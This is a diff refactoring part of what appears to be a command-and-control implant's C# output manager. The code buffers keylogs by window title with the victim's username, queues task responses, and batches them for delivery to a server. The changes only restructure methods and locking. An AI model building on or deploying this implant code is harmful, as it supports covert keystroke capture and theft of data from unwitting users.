@@ -150,10 +150,8 @@ namespace Agent.Managers
             retainedOutboundBytes -= bytes;
         }
 
-        private static int Utf8Bytes(string? value)
-        {
-            return value is null ? 0 : Encoding.UTF8.GetByteCount(value);
-        }
+        private static int Utf8Bytes(string? value) =>
+            value is null ? 0 : Encoding.UTF8.GetByteCount(value);
 
         private static int BufferedTaskResponseBytes(BufferedTaskResponse response) =>
             Utf8Bytes(response.TaskId) + response.OutputChunks.Sum(Utf8Bytes) + Utf8Bytes(response.Status) +
@@ -216,7 +214,7 @@ namespace Agent.Managers
             Merge(merged, update, separateOutputChunks);
             long sizeChange = BufferedTaskResponseBytes(merged) - BufferedTaskResponseBytes(existing);
             if (sizeChange > 0 && !TryReserveOrLog(pending, sizeChange, count: 0)) return;
-            else if (sizeChange < 0) Release(pending, -sizeChange);
+            if (sizeChange < 0) Release(pending, -sizeChange);
             pending.TaskResponses[response.task_id] = merged;
         }
 
@@ -224,24 +222,22 @@ namespace Agent.Managers
         {
             lock (outboundLock)
             {
-                if (!pending.Keylogs.TryGetValue(window_title, out Keylogs? keylog))
-                {
-                    if (!TryReserveOrLog(pending, Utf8Bytes(window_title) + Utf8Bytes(task_id) +
-                        Utf8Bytes(Environment.UserName) + Utf8Bytes(key))) return;
-                    if (string.IsNullOrEmpty(pending.KeylogTaskId)) pending.KeylogTaskId = task_id;
-                    keylog = new Keylogs
-                    {
-                        window_title = window_title,
-                        user = Environment.UserName,
-                        builder = new StringBuilder(),
-                    };
-                    pending.Keylogs.Add(window_title, keylog);
-                }
-                else
+                if (pending.Keylogs.TryGetValue(window_title, out Keylogs? keylog))
                 {
                     if (!TryReserveOrLog(pending, Utf8Bytes(key), count: 0)) return;
+                    keylog.builder.Append(key);
+                    return;
                 }
-                keylog.builder.Append(key);
+
+                if (!TryReserveOrLog(pending, Utf8Bytes(window_title) + Utf8Bytes(task_id) +
+                    Utf8Bytes(Environment.UserName) + Utf8Bytes(key))) return;
+                if (string.IsNullOrEmpty(pending.KeylogTaskId)) pending.KeylogTaskId = task_id;
+                pending.Keylogs.Add(window_title, new Keylogs
+                {
+                    window_title = window_title,
+                    user = Environment.UserName,
+                    builder = new StringBuilder(key),
+                });
             }
         }
 
@@ -336,10 +332,8 @@ namespace Agent.Managers
             }
         }
 
-        public void AddTaskResponse(string response)
-        {
+        public void AddTaskResponse(string response) =>
             AddTaskResponse(response, null, completed: false);
-        }
 
         public void AddTaskResponse(string response, string? taskId, bool completed)
         {
@@ -381,83 +375,74 @@ namespace Agent.Managers
             }
         }
 
-        public void Write(string? output, string task_id, bool completed)
-        {
+        public void Write(string? output, string task_id, bool completed) =>
             Write(output, task_id, completed, string.Empty);
-        }
 
-        public void WriteLine(string? output, string task_id, bool completed, string status)
-        {
+        public void WriteLine(string? output, string task_id, bool completed, string status) =>
             Write(output + Environment.NewLine, task_id, completed, status);
-        }
 
-        public void WriteLine(string? output, string task_id, bool completed)
-        {
+        public void WriteLine(string? output, string task_id, bool completed) =>
             WriteLine(output, task_id, completed, string.Empty);
-        }
 
-        public void AddJob(ServerJob job)
-        {
+        public void AddJob(ServerJob job) =>
             this.activeJobs.TryAdd(job.task.id, job);
-        }
 
-        public bool TryGetJob(string task_id, out ServerJob? job)
-        {
-            return this.activeJobs.TryGetValue(task_id, out job);
-        }
+        public bool TryGetJob(string task_id, out ServerJob? job) =>
+            this.activeJobs.TryGetValue(task_id, out job);
 
-        public Dictionary<string, ServerJob> GetJobs()
-        {
-            return this.activeJobs.ToDictionary(item => item.Key, item => item.Value, this.activeJobs.Comparer);
-        }
+        public Dictionary<string, ServerJob> GetJobs() =>
+            this.activeJobs.ToDictionary(item => item.Key, item => item.Value, this.activeJobs.Comparer);
 
-        public void CompleteJob(string task_id)
-        {
+        public void CompleteJob(string task_id) =>
             this.activeJobs.TryRemove(task_id, out _);
-        }
 
         public async Task<T> DeliverAsync<T>(Func<string, Task<T>> deliver, Func<T, bool> accepted)
         {
             await deliveryLock.WaitAsync();
             try
             {
-                InFlightBatch batch;
-                lock (outboundLock)
-                {
-                    if (inFlight is null)
-                    {
-                        OutboundBuffer leased = pending;
-                        inFlight = new InFlightBatch(leased, Serialize(leased));
-                        pending = new OutboundBuffer();
-                    }
-                    batch = inFlight;
-                }
-
+                InFlightBatch batch = AcquireInFlightBatch();
                 T result = await deliver(batch.Message);
-                if (!accepted(result)) return result;
+                if (accepted(result))
+                    CompleteInFlightBatch(batch);
 
-                lock (outboundLock)
-                {
-                    foreach (BufferedTaskResponse response in batch.Buffer.TaskResponses.Values)
-                    {
-                        if (response.Completed) activeJobs.TryRemove(response.TaskId, out _);
-                    }
-                    foreach (BufferedSerializedResponse response in batch.Buffer.SerializedResponses)
-                    {
-                        if (response.Completed && response.TaskId is not null)
-                            activeJobs.TryRemove(response.TaskId, out _);
-                    }
-                    retainedDatagramBytes -= batch.Buffer.DatagramBytes;
-                    retainedDatagramCount -= batch.Buffer.DatagramCount;
-                    retainedOutboundBytes -= batch.Buffer.Bytes;
-                    retainedOutboundCount -= batch.Buffer.Count;
-                    inFlight = null;
-                }
                 return result;
             }
             finally
             {
                 deliveryLock.Release();
+            }
+        }
+
+        private InFlightBatch AcquireInFlightBatch()
+        {
+            lock (outboundLock)
+            {
+                if (inFlight is null)
+                {
+                    OutboundBuffer leased = pending;
+                    inFlight = new InFlightBatch(leased, Serialize(leased));
+                    pending = new OutboundBuffer();
+                }
+                return inFlight;
+            }
+        }
+
+        private void CompleteInFlightBatch(InFlightBatch batch)
+        {
+            lock (outboundLock)
+            {
+                foreach (BufferedTaskResponse response in batch.Buffer.TaskResponses.Values.Where(r => r.Completed))
+                    activeJobs.TryRemove(response.TaskId, out _);
+
+                foreach (BufferedSerializedResponse response in batch.Buffer.SerializedResponses.Where(r => r.Completed && r.TaskId is not null))
+                    activeJobs.TryRemove(response.TaskId!, out _);
+
+                retainedDatagramBytes -= batch.Buffer.DatagramBytes;
+                retainedDatagramCount -= batch.Buffer.DatagramCount;
+                retainedOutboundBytes -= batch.Buffer.Bytes;
+                retainedOutboundCount -= batch.Buffer.Count;
+                inFlight = null;
             }
         }
 
